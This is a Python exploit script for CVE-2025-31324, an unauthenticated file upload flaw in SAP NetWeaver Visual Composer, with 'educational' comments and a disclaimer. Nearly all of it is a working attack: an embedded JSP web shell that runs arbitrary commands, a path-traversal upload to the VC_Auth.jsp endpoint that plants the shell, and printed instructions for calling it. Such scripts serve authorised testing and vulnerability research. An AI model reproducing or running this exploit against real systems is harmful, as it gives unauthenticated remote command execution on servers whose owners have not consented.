#!/usr/bin/env python3

# ###########################################################################
#
#   SAP Visual Composer Unauthenticated File Upload to RCE (CVE-2025-31324)
#
# ###########################################################################
#
#   Author:         0x5t
#   Blog:           https://0x5t.raptx.org
#
#   Description:    This script exploits a critical unauthenticated file upload
#                   vulnerability in SAP NetWeaver Visual Composer. It uploads
#                   a JSP web shell packaged in a ZIP archive to achieve RCE.
#                   The technique is based on public analysis from Unit 42
#                   and Onapsis.
#
#   Reference:      - https://unit42.paloaltonetworks.com/threat-brief-sap-netweaver-cve-2025-31324/
#                   - https://onapsis.com/blog/active-exploitation-of-sap-vulnerability-cve-2025-31324/
#
#   Disclaimer:     This tool is for authorized security research and educational
#                   purposes ONLY. Illegal use of this script is strictly prohibited.
#
# ###########################################################################

import requests
import argparse
import io
import zipfile
import urllib3

# This disables warnings for using self-signed certificates in a lab environment.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Educational Point 1: The Payload
# The goal is to upload a "web shell," a script that takes commands from a URL
# parameter and executes them on the server. This provides Remote Code Execution (RCE).
JSP_SHELL_CONTENT = """
<%@ page import="java.io.*" %>
<pre>
<%
    if (request.getParameter("cmd") != null) {
        // Execute the command passed in the 'cmd' URL parameter.
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        // Display the command's output on the web page.
        new BufferedReader(new InputStreamReader(p.getInputStream())).transferTo(out);
    }
%>
</pre>
"""

def exploit(target_url, shell_name):
    """
    Constructs and sends the exploit payload.
    """
    # Educational Point 2: The Vulnerable Endpoint
    # Research confirms CVE-2025-31324 resides in the Visual Composer (VC) component.
    # This endpoint incorrectly lacks an authentication check.
    vulnerable_endpoint = f"{target_url}/VC/Auth/VC_Auth.jsp"
    
    # Educational Point 3: The Path Traversal Payload
    # This is the core of the arbitrary file write. The '..' sequence navigates
    # up the directory tree, allowing us to write outside the intended folder
    # and into a web-accessible directory.
    traversal_path = "../../../../../../../../../../../../../../../../../"
    target_directory = "apps/sap.com/vc~wd~ext/servlet_jsp/VC/root/"
    malicious_filename_path = f"{traversal_path}{target_directory}{shell_name}"
    
    print(f"[INFO] Target Endpoint: {vulnerable_endpoint}")
    print(f"[INFO] Malicious Path Payload: {malicious_filename_path}")

    # The server endpoint expects the uploaded content to be a ZIP archive.
    in_memory_zip = io.BytesIO()
    with zipfile.ZipFile(in_memory_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('payload.jsp', JSP_SHELL_CONTENT)
    zip_data = in_memory_zip.getvalue()
    
    # Educational Point 4: The Multipart Request Structure
    # Public analysis confirms the exploit requires two distinct form fields.
    # The server's code reads the path from the 'FILENAME' field and the content
    # from the 'zip' field. This separation is key to a successful exploit.
    data_payload = {
        'FILENAME': malicious_filename_path
    }
    files_payload = {
        'zip': ('payload.zip', zip_data, 'application/octet-stream')
    }

    try:
        print("[INFO] Sending multipart request...")
        response = requests.post(
            vulnerable_endpoint,
            data=data_payload,
            files=files_payload,
            verify=False,
            timeout=20
        )

        if response.status_code == 200:
            shell_url = f"{target_url}/VC/root/{shell_name}"
            print("\n[SUCCESS] Server responded with HTTP 200. Upload is likely successful.")
            print(f"[ACTION] Verify the web shell at: {shell_url}")
            print(f"[EXAMPLE] {shell_url}?cmd=whoami")
        else:
            print(f"\n[FAILED] Server responded with HTTP {response.status_code}.")
            print(f"         The target may not be vulnerable or is behind a WAF.")

    except requests.exceptions.RequestException as e:
        print(f"\n[ERROR] An error occurred during the request: {e}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="SAP Visual Composer Unauthenticated File Upload Exploit (CVE-2025-31324)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('target', help="Base URL of the target SAP system (e.g., http://10.0.0.1:50000)")
    parser.add_argument('--filename', default="vc_shell.jsp", help="Name for the uploaded JSP shell.")
    
    args = parser.parse_args()
    exploit(args.target, args.filename)
